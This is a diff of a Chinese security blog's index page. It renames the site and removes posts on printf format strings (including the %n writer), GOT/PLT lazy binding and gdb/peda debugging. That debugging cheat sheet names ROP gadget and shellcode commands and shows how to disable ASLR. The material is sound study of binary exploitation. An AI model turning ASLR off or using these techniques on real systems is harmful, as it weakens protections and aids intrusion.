@@ -2,10 +2,8 @@
 
 
 
-  
 
-
-<html class="theme-next mist use-motion" lang="zh-Hans">
+<html class="theme-next mist" lang="zh-Hans">
 <head>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
@@ -85,7 +83,7 @@
 
 
 
-  <link rel="alternate" href="/atom.xml" title="上善若水" type="application/atom+xml" />
+  <link rel="alternate" href="/atom.xml" title="Introspelliam" type="application/atom+xml" />
 
 
 
@@ -99,12 +97,12 @@
 
 <meta name="description" content="Try your best!">
 <meta property="og:type" content="website">
-<meta property="og:title" content="上善若水">
+<meta property="og:title" content="Introspelliam">
 <meta property="og:url" content="http://yoursite.com/page/10/index.html">
-<meta property="og:site_name" content="上善若水">
+<meta property="og:site_name" content="Introspelliam">
 <meta property="og:description" content="Try your best!">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="上善若水">
+<meta name="twitter:title" content="Introspelliam">
 <meta name="twitter:description" content="Try your best!">
 
 
@@ -115,10 +113,10 @@
     root: '/',
     scheme: 'Mist',
     version: '5.1.2',
-    sidebar: {"position":"right","display":"post","offset":12,"offset_float":12,"b2t":true,"scrollpercent":false,"onmobile":true},
+    sidebar: {"position":"right","display":"always","offset":0,"offset_float":0,"b2t":true,"scrollpercent":true,"onmobile":true},
     fancybox: true,
     tabs: true,
-    motion: true,
+    motion: false,
     duoshuo: {
       userId: '0',
       author: '博主'
@@ -141,7 +139,7 @@
 
 
 
-  <title>上善若水 - 古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</title>
+  <title>Introspelliam - Just do what works for you, because there will always be someone who thinks differently.</title>
   
 
 
@@ -182,12 +180,12 @@
     <div class="custom-logo-site-title">
       <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
-        <span class="site-title">上善若水</span>
+        <span class="site-title">Introspelliam</span>
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
       
-        <h1 class="site-subtitle" itemprop="description">古之立大事者，不惟有超世之才，亦必有坚韧不拔之志！</h1>
+        <h1 class="site-subtitle" itemprop="description">Just do what works for you, because there will always be someone who thinks differently.</h1>
       
   </div>
 
@@ -333,7 +331,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/04/printf格式化字符串/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/07/18/0day/攻击SEHOP的方法/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Introspelliam">
@@ -342,7 +340,7 @@
     </span>
 
     <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
+      <meta itemprop="name" content="Introspelliam">
     </span>
 
     
@@ -352,2390 +350,7 @@
         
           <h2 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2017/08/04/printf格式化字符串/" itemprop="url">printf格式化字符串</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-04T19:58:27+08:00">
-                2017-08-04
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1-格式化字符串定义"><a href="#1-格式化字符串定义" class="headerlink" title="1. 格式化字符串定义"></a>1. 格式化字符串定义</h3><p><strong>格式化字符串</strong>，是一些程序设计语言在格式化输出API函数中用于指定输出参数的格式与相对位置的字符串参数，例如C、C++等程序设计语言的printf类函数，其中的转换说明（conversion specification）用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。</p>
-<h3 id="2-POSIX标准下的printf函数"><a href="#2-POSIX标准下的printf函数" class="headerlink" title="2. POSIX标准下的printf函数"></a>2. POSIX标准下的printf函数</h3><h4 id="2-1-格式化占位符"><a href="#2-1-格式化占位符" class="headerlink" title="2.1 格式化占位符"></a>2.1 格式化占位符</h4><p>格式化字符串中的占位符用于指明输出的参数值如何格式化。</p>
-<p>格式化占位符（format placeholder），语法是：</p>
-<blockquote>
-<p><strong>%[parameter][flags][field width][.precision][length]type</strong></p>
-</blockquote>
-<p><strong>Parameter</strong>可以忽略或者是：</p>
-<table>
-<thead>
-<tr>
-<th style="text-align:center">字符</th>
-<th style="text-align:left">描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td style="text-align:center">n$</td>
-<td style="text-align:left"><strong><font color="#f00">n是用这个格式说明符（specifier）显示第几个参数</font></strong>；这使得参数可以输出多次，使用多个格式说明符，以不同的顺序输出。 如果任意一个占位符使用了parameter，则其他所有占位符必须也使用parameter。这是POSIX扩展，不属于ISO C。例：<br><code>printf(&quot;%2$d %2$#x; %1$d %1$#x&quot;,16,17) 产生&quot;17 0x11; 16 0x10&quot;</code></td>
-</tr>
-</tbody>
-</table>
-<p><strong>Flags</strong>可为0个或多个：</p>
-<table>
-<thead>
-<tr>
-<th>字符</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>+</td>
-<td>总是表示有符号数值的&#39;+&#39;或&#39;-&#39;号，缺省情况是忽略正数的符号。仅适用于数值类型。</td>
-</tr>
-<tr>
-<td>空格</td>
-<td>使得有符号数的输出如果没有正负号或者输出0个字符，则前缀1个空格。如果空格与&#39;+&#39;同时出现，则空格说明符被忽略。</td>
-</tr>
-<tr>
-<td>-</td>
-<td>左对齐。缺省情况是右对齐。</td>
-</tr>
-<tr>
-<td>#</td>
-<td>对于&#39;g&#39;与&#39;G&#39;，不删除尾部0以表示精度。对于&#39;f&#39;, &#39;F&#39;, &#39;e&#39;, &#39;E&#39;, &#39;g&#39;, &#39;G&#39;, 总是输出小数点。对于&#39;o&#39;, &#39;x&#39;, &#39;X&#39;, 在非0数值前分别输出前缀0, 0x, and 0X表示数制。</td>
-</tr>
-<tr>
-<td>0</td>
-<td>如果width选项前缀以0，则在左侧用0填充直至达到宽度要求。例如printf(&quot;%2d&quot;, 3)输出&quot; 3&quot;，而printf(&quot;%02d&quot;, 3)输出&quot;03&quot;。如果0与-均出现，则0被忽略，即左对齐依然用空格填充。</td>
-</tr>
-</tbody>
-</table>
-<p><strong>Field Width</strong>给出显示数值的最小宽度，典型用于制表输出时填充固定宽度的表目。实际输出字符的个数不足域宽，则根据左对齐或右对齐进行填充。实际输出字符的个数超过域宽并不引起数值截断，而是显示全部。宽度值的前导0被解释为0填充标志，如上述；前导的负值被解释为其绝对值，负号解释为左对齐标志。如果域宽值为<code>*</code>，则由对应的函数参数的值为当前域宽。</p>
-<p><strong>Precision</strong>通常指明输出的<em>最大</em>长度，依赖于特定的格式化类型。对于d、i、u、x、o的整型数值，是指最小数字位数，不足的位要在左侧补0，如果超过也不截断，缺省值为1。对于a,A,e,E,f,F的浮点数值，是指小数点右边显示的数字位数，必要时四舍五入；缺省值为6。对于g,G的浮点数值，是指有效数字的最大位数。对于s的字符串类型，是指输出的字节的上限，超出限制的其它字符将被截断。如果域宽为<code>*</code>，则由对应的函数参数的值为当前域宽。如果仅给出了小数点，则域宽为0。</p>
-<p><strong>Length</strong>指出浮点型参数或整型参数的长度。此项Microsoft称为“Size”。可以忽略，或者是下述：</p>
-<table>
-<thead>
-<tr>
-<th>字符</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>hh</td>
-<td>对于整数类型，printf期待一个从char提升的int尺寸的整型参数。</td>
-</tr>
-<tr>
-<td>h</td>
-<td>对于整数类型，printf期待一个从short提升的int尺寸的整型参数。</td>
-</tr>
-<tr>
-<td>l</td>
-<td>对于整数类型，printf期待一个long尺寸的整型参数。<br>对于浮点类型，printf期待一个double尺寸的整型参数。<br>对于字符串s类型，printf期待一个wchar_t指针参数。<br>对于字符c类型，printf期待一个wint_t型的参数。</td>
-</tr>
-<tr>
-<td>ll</td>
-<td>对于整数类型，printf期待一个long long尺寸的整型参数。Microsoft也可以使用I64</td>
-</tr>
-<tr>
-<td>L</td>
-<td>对于浮点类型，printf期待一个long double尺寸的整型参数。</td>
-</tr>
-<tr>
-<td>z</td>
-<td>对于整数类型，printf期待一个size_t尺寸的整型参数。</td>
-</tr>
-<tr>
-<td>j</td>
-<td>对于整数类型，printf期待一个intmax_t尺寸的整型参数。</td>
-</tr>
-<tr>
-<td>t</td>
-<td>对于整数类型，printf期待一个ptrdiff_t尺寸的整型参数。</td>
-</tr>
-</tbody>
-</table>
-<p>此外，在ISO C99广泛接受前，还有几个平台相关的length选项：</p>
-<table>
-<thead>
-<tr>
-<th>字符</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>I</td>
-<td>对于有符号整数类型，printf期待一个ptrdiff_t尺寸的整型参数。对于无符号整数类型，printf期待一个size_t尺寸的整型参数。常见于Win32/Win64平台。</td>
-</tr>
-<tr>
-<td>I32</td>
-<td>对于整数类型，printf期待一个32位（双字）的整型参数。常见于Win32/Win64平台。</td>
-</tr>
-<tr>
-<td>I64</td>
-<td>对于整数类型，printf期待一个64位（四字）的整型参数。常见于Win32/Win64平台。</td>
-</tr>
-<tr>
-<td>q</td>
-<td>对于整数类型，printf期待一个64位（四字）的整型参数。常见于BSD平台。</td>
-</tr>
-</tbody>
-</table>
-<p>ISO C99的头文件<code>inttypes.h</code>包含了许多宏，用于平台独立的<code>printf</code>编码。例如：</p>
-<h4 id="2-2-类型"><a href="#2-2-类型" class="headerlink" title="2.2 类型"></a>2.2 类型</h4><p><strong>Type</strong>，也称转换说明（conversion specification/specifier），可以是：</p>
-<table>
-<thead>
-<tr>
-<th>字符</th>
-<th>描述</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>d,i</td>
-<td>有符号十进制数值int。&#39;%d&#39;与&#39;%i&#39;对于输出是同义；但对于scanf()输入二者不同，其中%i在输入值有前缀0x或0时，分别表示16进制或8进制的值。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
-</tr>
-<tr>
-<td>u</td>
-<td>十进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
-</tr>
-<tr>
-<td>f,F</td>
-<td>double型输出10进制定点表示。&#39;f&#39;与&#39;F&#39;差异是表示无穷与NaN时，&#39;f&#39;输出&#39;inf&#39;, &#39;infinity&#39;与&#39;nan&#39;；&#39;F&#39;输出&#39;INF&#39;, &#39;INFINITY&#39;与&#39;NAN&#39;。小数点后的数字位数等于精度，最后一位数字四舍五入。精度默认为6。如果精度为0且没有#标记，则不出现小数点。小数点左侧至少一位数字。</td>
-</tr>
-<tr>
-<td>e,E</td>
-<td>double值，输出形式为10进制的([-]d.ddd e[+/-]ddd). E版本使用的指数符号为E（而不是e）。指数部分至少包含2位数字，如果值为0，则指数部分为00。Windows系统，指数部分至少为3位数字，例如1.5e002，也可用Microsoft版的运行时函数_set_output_format 修改。小数点前存在1位数字。小数点后的数字位数等于精度。精度默认为6。如果精度为0且没有#标记，则不出现小数点。</td>
-</tr>
-<tr>
-<td>g,G</td>
-<td>double型数值，精度定义为全部有效数字位数。当指数部分在闭区间 [-4,精度] 内，输出为定点形式；否则输出为指数浮点形式。&#39;g&#39;使用小写字母，&#39;G&#39;使用大写字母。小数点右侧的尾数0不被显示；显示小数点仅当输出的小数部分不为0。</td>
-</tr>
-<tr>
-<td>x,X</td>
-<td>16进制unsigned int。&#39;x&#39;使用小写字母；&#39;X&#39;使用大写字母。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
-</tr>
-<tr>
-<td>o</td>
-<td>8进制unsigned int。如果指定了精度，则输出的数字不足时在左侧补0。默认精度为1。精度为0且值为0，则输出为空。</td>
-</tr>
-<tr>
-<td>s</td>
-<td>如果没有用l标志，输出null结尾字符串直到精度规定的上限；如果没有指定精度，则输出所有字节。如果用了l标志，则对应函数参数指向wchar_t型的数组，输出时把每个宽字符转化为多字节字符，相当于调用wcrtomb函数。</td>
-</tr>
-<tr>
-<td>c</td>
-<td>如果没有用l标志，把int参数转为unsigned char型输出；如果用了l标志，把wint_t参数转为包含两个元素的wchart_t数组，其中第一个元素包含要输出的字符，第二个元素为null宽字符。</td>
-</tr>
-<tr>
-<td>p</td>
-<td>void *型</td>
-</tr>
-<tr>
-<td>a,A</td>
-<td>double型的16进制表示，&quot;[−]0xh.hhhh p±d&quot;。其中指数部分为10进制表示的形式。例如：1025.010输出为0x1.004000p+10。&#39;a&#39;使用小写字母，&#39;A&#39;使用大写字母。（C++11流使用hexfloat输出16进制浮点数）</td>
-</tr>
-<tr>
-<td>n</td>
-<td><font color="#f00">不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量。</font></td>
-</tr>
-<tr>
-<td>%</td>
-<td>&#39;%&#39;字面值，不接受任何flags, width, precision or length。</td>
-</tr>
-</tbody>
-</table>
-<p>宽度与精度格式化参数可以忽略，或者直接指定，或者用星号&quot;<code>*</code>&quot;表示取对应函数参数的值。例如<code>printf(&quot;%*d&quot;, 5, 10)</code>输出&quot;<code>10</code>&quot;；<code>printf(&quot;%.*s&quot;, 3, &quot;abcdef&quot;)</code> 输出&quot;<code>abc</code>&quot;。</p>
-<font color="#f000">如果函数参数太少，不能匹配所有的格式参数说明符，或者函数参数的类型不匹配，将导致未定义（undefined）行为。过多的函数参数被忽略。许多时候，未定义的行为将导致<a href="https://zh.wikipedia.org/w/index.php?title=%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%94%BB%E5%87%BB&amp;action=edit&amp;redlink=1" target="_blank" rel="external">格式化字符串攻击</a>。</font>
-
-<p>某些编译器，如<a href="https://zh.wikipedia.org/wiki/GCC" target="_blank" rel="external">GCC</a>，会静态检查printf这一类函数的格式化参数并编译警告存在的问题（当使用编译标志<code>-Wall</code>或<code>-Wformat</code>）。GCC也会对用户自定义的printf风格函数做静态检查，如果在函数定义时使用了非标准的&quot;<code>format</code>&quot; <code>__attribute__</code>。</p>
-<h3 id="3-printf函数的引申"><a href="#3-printf函数的引申" class="headerlink" title="3. printf函数的引申"></a>3. printf函数的引申</h3><p>其实不止printf函数可以格式化字符串，printf函数的变形也可以，例如printf_chk</p>
-<p>printf_chk和printf不同的地方有两点：</p>
-<ol>
-<li>不能使用$n不连续的打印</li>
-<li>在使用%n的时候会做一系列检查</li>
-</ol>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/03/got、plt表介绍/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/08/03/got、plt表介绍/" itemprop="url">got、plt表介绍</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-03T22:31:33+08:00">
-                2017-08-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1-GOT表和PLT表"><a href="#1-GOT表和PLT表" class="headerlink" title="1. GOT表和PLT表"></a>1. GOT表和PLT表</h3><p>GOT（Global Offset Table，全局偏移表）是Linux ELF文件中用于定位全局变量和函数的一个表。PLT（Procedure Linkage Table，过程链接表）是Linux ELF文件中用于延迟绑定的表，即函数第一次被调用的时候才进行绑定。</p>
-<h3 id="2-延迟绑定"><a href="#2-延迟绑定" class="headerlink" title="2. 延迟绑定"></a>2. 延迟绑定</h3><p>所谓延迟绑定，就是当函数第一次被调用的时候才进行绑定（包括符号查找、重定位等），如果函数从来没有用到过就不进行绑定。基于延迟绑定可以大大加快程序的启动速度，特别有利于一些引用了大量函数的程序</p>
-<h3 id="3-延迟绑定的基本原理"><a href="#3-延迟绑定的基本原理" class="headerlink" title="3. 延迟绑定的基本原理"></a>3. 延迟绑定的基本原理</h3><p>假如存在一个bar函数，这个函数在PLT中的条目为bar@plt，在GOT中的条目为bar@got，那么在第一次调用bar函数的时候，首先会跳转到PLT，伪代码如下：</p>
-<p>bar@plt:</p>
-<p>jmp bar@got</p>
-<p>patch bar@got</p>
-<p>这里会从PLT跳转到GOT，如果函数从来没有调用过，那么这时候GOT会跳转回PLT并调用patch bar@got，这一行代码的作用是将bar函数真正的地址填充到bar@got，然后跳转到bar函数真正的地址执行代码。当我们下次再调用bar函数的时候，执行路径就是先后跳转到bar@plt、bar@got、bar真正的地址。具体来看个实例：</p>
-<p>vulnerable_function函数调用了read函数，由于read函数是动态链接加载进来的只有在链接的时候才知道地址，编译时并不知道地址</p>
-<p><img src="/images/2017-08-03/1.png" alt="1"></p>
-<p>执行call _read函数会跳到plt表中寻找中：</p>
-<p><img src="/images/2017-08-03/2.png" alt="2"></p>
-<p>plt表中会继续跳入到got表中寻找</p>
-<p><img src="/images/2017-08-03/3.png" alt="3"></p>
-<p>got表中的所存的read函数的地址便是在pwn6进程中的实际地址，也就是</p>
-<p><img src="/images/2017-08-03/4.png" alt="4"></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/08/03/gdb的调试与使用/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Introspelliam">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/me.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="上善若水">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h2 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2017/08/03/gdb的调试与使用/" itemprop="url">gdb的调试与使用</a></h2>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-08-03T22:22:50+08:00">
-                2017-08-03
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/pwn/" itemprop="url" rel="index">
-                    <span itemprop="name">pwn</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="1-调试的快捷键"><a href="#1-调试的快捷键" class="headerlink" title="1. 调试的快捷键"></a>1. 调试的快捷键</h3><font color="#f00">peda带有的功能，直接输入命令，其就会给予提示（如果不是这样，基本上也是该命令就可以不带参数）。这儿就不多做介绍</font>
-
-<h4 id="1-1-基础的调试快捷键"><a href="#1-1-基础的调试快捷键" class="headerlink" title="1.1 基础的调试快捷键"></a>1.1 基础的调试快捷键</h4><ul>
-<li>s step，si步入</li>
-<li>n 执行下一条指令  ni步入</li>
-<li>b 在某处下断点，可以用 <ul>
-<li>b * adrress</li>
-<li>b function_name</li>
-<li>info b  查看断点信息</li>
-<li>delete 1删除第一个断点</li>
-</ul>
-</li>
-<li>c 继续</li>
-<li>r 执行</li>
-<li>disas addr 查看addr处前后的反汇编代码</li>
-</ul>
-<h4 id="1-2-显示数据"><a href="#1-2-显示数据" class="headerlink" title="1.2 显示数据"></a>1.2 显示数据</h4><ul>
-<li>p 系列<ul>
-<li>p system/main  显示某个函数地址<ul>
-<li>p $esp    显示寄存器</li>
-</ul>
-</li>
-<li>p/x  p/a p/b p/s。。。</li>
-<li>p 0xff - 0xea   <font color="#f00">计算器</font></li>
-<li>print &amp;VarName 查看变量地址</li>
-<li>p * 0xffffebac   查看某个地址处的值</li>
-</ul>
-</li>
-<li>x系列<ul>
-<li>x/xw addr 显示某个地址处开始的16进制内容，如果有符号表会加载符号表</li>
-<li>x/x $esp 查看esp寄存器中的值</li>
-<li>x/s addr 查看addr处的字符串</li>
-<li>x/b addr 查看addr处的字符</li>
-<li>x/i  addr 查看addr处的反汇编结果</li>
-</ul>
-</li>
-<li>info系列<ul>
-<li>info register $ebp  查看寄存器ebp中的内容 (简写为 i r ebp)</li>
-<li>i r eflags 查看状态寄存器</li>
-<li>i r ss        查看段寄存器</li>
-<li>i b            查看断点信息</li>
-<li>i functions  查看所有的函数</li>
-</ul>
-</li>
-<li>disas addr 查看addr处前后的反汇编代码</li>
-<li>stack 20   查看栈内20个值</li>
-<li>show args  查看参数</li>
-<li>vmmap 查看映射状况 <font color="#f00">peda带有</font></li>
-<li>readelf 查看elf文件中各个段的起始地址  <font color="#f00">peda带有</font></li>
-<li>parseheap 显示堆状况  <font color="#f00">peda带有</font></li>
-</ul>
-<h4 id="1-3-查找数据"><a href="#1-3-查找数据" class="headerlink" title="1.3 查找数据"></a>1.3 查找数据</h4><ul>
-<li>find 查找字符串    <font color="#f00">peda带有</font></li>
-<li>searchmem 查找字符串  <font color="#f00">peda带有</font></li>
-<li>ropsearch &quot;xor eax,eax;ret&quot;  0x08048080 0x08050000   查找某段的rop  <font color="#f00">peda带有</font></li>
-<li>ropgadget  提供多个pop|ret可行结果  <font color="#f00">peda带有</font></li>
-</ul>
-<h4 id="1-4-修改数据"><a href="#1-4-修改数据" class="headerlink" title="1.4 修改数据"></a>1.4 修改数据</h4><ul>
-<li>set $esp=0x110  修改寄存器的值</li>
-<li>set *0xf7ff3234=0x08042334 修改内存的值</li>
-<li>set args &quot;asdasg&quot; &quot;afdasgasg&quot; &quot;agasdsa&quot;  分别给参数1,2,3赋值</li>
-<li>set args &quot;`python -c &#39;print &quot;1234\x7f\xde&quot;&#39;`&quot;    这个参数中用python脚本重写了一下，避免有些字符无法正确设置</li>
-<li>r &quot;arg1&quot; &quot;arg2&quot; &quot;arg3&quot;   设置参数</li>
-<li>run `$(perl -e &#39;print &quot;A&quot;x20&#39;)`</li>
-</ul>
-<h4 id="1-1-peda插件"><a href="#1-1-peda插件" class="headerlink" title="1.1 peda插件"></a>1.1 peda插件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">Enhance the display of gdb: colorize and display disassembly codes, registers, memory information during debugging.</div><div class="line">Add commands to support debugging and exploit development (for a full list of commands use peda help):</div><div class="line">aslr -- Show/set ASLR setting of GDB</div><div class="line">checksec -- Check for various security options of binary</div><div class="line">dumpargs -- Display arguments passed to a function when stopped at a call instruction</div><div class="line">dumprop -- Dump all ROP gadgets in specific memory range</div><div class="line">elfheader -- Get headers information from debugged ELF file</div><div class="line">elfsymbol -- Get non-debugging symbol information from an ELF file</div><div class="line">lookup -- Search for all addresses/references to addresses which belong to a memory range</div><div class="line">patch -- Patch memory start at an address with string/hexstring/int</div><div class="line">pattern -- Generate, search, or write a cyclic pattern to memory</div><div class="line">procinfo -- Display various info from /proc/pid/</div><div class="line">pshow -- Show various PEDA options and other settings</div><div class="line">pset -- Set various PEDA options and other settings</div><div class="line">readelf -- Get headers information from an ELF file</div><div class="line">ropgadget -- Get common ROP gadgets of binary or library</div><div class="line">ropsearch -- Search for ROP gadgets in memory</div><div class="line">searchmem|find -- Search for a pattern in memory; support regex search</div><div class="line">shellcode -- Generate or download common shellcodes.</div><div class="line">skeleton -- Generate python exploit code template</div><div class="line">vmmap -- Get virtual mapping address ranges of section(s) in debugged process</div><div class="line">xormem -- XOR a memory region with a key</div><div class="line">Installation</div></pre></td></tr></table></figure>
-<p><strong>vmmap：查看当前程序映射的内存块</strong><br><strong>dumprop：</strong></p>
-<h3 id="2-查找某个plt、got、plt-2"><a href="#2-查找某个plt、got、plt-2" class="headerlink" title="2. 查找某个plt、got、plt_2"></a>2. 查找某个plt、got、plt_2</h3><ul>
-<li>plt 可以直接使用pwntools中的ELF(elf).symbols(function_name)</li>
-<li>got 可以直接使用pwntools中的ELF(elf).got(function_name)</li>
-<li>plt_2 可以直接使用pwntools中的ELF(lib).symbols(function_name)</li>
-</ul>
-<h3 id="3-查找程序所动态链接的库"><a href="#3-查找程序所动态链接的库" class="headerlink" title="3. 查找程序所动态链接的库"></a>3. 查找程序所动态链接的库</h3><ul>
-<li><p>file pwn3</p>
-<ul>
-<li>pwn3: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.24, BuildID[sha1]=916959406d0c545f6971223c8e06bff1ed9ae74d, not stripped</li>
-</ul>
-</li>
-<li><p>checksec pwn3</p>
-<ul>
-<li>[*] &#39;/root/Desktop/Pwnable/fmt/normal/fmt_string_write_got/pwn3&#39;<br>Arch:     i386-32-little<br>RELRO:    Partial RELRO<br>Stack:    No canary found<br>NX:       NX enabled<br>PIE:      No PIE (0x8048000)</li>
-</ul>
-</li>
-</ul>
-<ul>
-<li>ldd pwn3<ul>
-<li>linux-gate.so.1 (0xf77ad000)<br>libc.so.6 =&gt; /lib32/libc.so.6 (0xf75d2000)<br>/lib/ld-linux.so.2 (0x56601000)</li>
-</ul>
-</li>
-</ul>
-<h3 id="4-编译32位可执行文件"><a href="#4-编译32位可执行文件" class="headerlink" title="4. 编译32位可执行文件"></a>4. 编译32位可执行文件</h3><ul>
-<li><p>gcc -m32 test.c -o test</p>
-<ul>
-<li>一般而言此时的目标文件为32位，且不能生成调试信息</li>
-</ul>
-</li>
-<li><p>gcc -m32 -g test.c -o test</p>
-<ul>
-<li><p>生成的目标文件是32位，且可以利用操作系统的“原生格式（native format）”生成调试</p>
-<p>信息。GDB 可以直接利用这个信息，其它调试器也可以使用这个调试信息</p>
-</li>
-</ul>
-</li>
-<li><p>其它保护状态的开启，请参考<a href="/2017/09/30/linux程序的常用保护机制/"><em>linux程序的常用保护机制</em></a></p>
-</li>
-</ul>
-<h3 id="5-开启PIE之后的调试"><a href="#5-开启PIE之后的调试" class="headerlink" title="5. 开启PIE之后的调试"></a>5. 开启PIE之后的调试</h3><p>开启PIE之后，地址会一直在变，这十分不利于gdb的调试，所以这时候应该在本地关闭ASLR</p>
-<p>常用的方法是：echo 0 &gt; /proc/sys/kernel/randomize_va_space</p>
-<p>开启的方式是：echo 2 &gt; /proc/sys/kernel/randomize_va_space</p>
